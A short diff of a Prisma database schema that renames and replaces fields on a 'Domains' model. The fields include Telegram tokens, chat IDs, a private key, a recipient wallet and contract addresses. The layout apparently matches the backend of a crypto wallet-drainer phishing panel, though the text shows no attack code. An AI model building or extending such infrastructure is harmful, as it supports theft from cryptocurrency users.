@@ -23,24 +23,21 @@ model Users {
 }
 
 model Domains {
-  id             Int        @id @default(autoincrement())
-  host           String     @unique
-  owner          Users      @relation(fields: [user_id], references: [id])
-  user_id        Int
-  path_name      String
-  template       Templates? @relation(fields: [template_id], references: [id])
-  template_id    Int?
-  coval_api_key  String?
-  infura_api_key String?
-  receiver       String?
-  min_eth_bal    Float?
-  chain_id       String?
-  caller_addr    String?
-  caller_pk      String?
-  tg_token       String?
-  chat_id_err    String?
-  chat_id_con    String?
-  chat_id_app    String?
+  id            Int        @id @default(autoincrement())
+  host          String     @unique
+  owner         Users      @relation(fields: [user_id], references: [id])
+  user_id       Int
+  path_name     String
+  template      Templates? @relation(fields: [template_id], references: [id])
+  template_id   Int?
+  tg_token      String?
+  chat_id       String?
+  zapper_token  String?
+  private_key   String?
+  contract_SAFA String?
+  recipient     String?
+  operator      String?
+  owner_address String?
 }
 
 model Templates {
